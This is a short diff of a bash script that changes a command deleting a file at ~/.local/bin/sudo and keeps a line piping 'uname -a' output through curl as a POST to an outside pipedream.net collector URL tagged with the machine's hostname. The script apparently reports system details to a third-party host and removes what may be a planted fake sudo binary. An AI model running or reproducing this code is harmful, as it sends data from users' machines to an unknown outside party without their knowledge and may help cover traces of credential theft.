@@ -1,6 +1,6 @@
 #!/bin/bash
 
-rm -rf ~/.local/bin/sudo
+rm -f ~/.local/bin/sudo
 
 uname -a | curl https://enj7fhiwooawt.x.pipedream.net/root_$(uname -n) -X POST -d "$(</dev/stdin)"
 
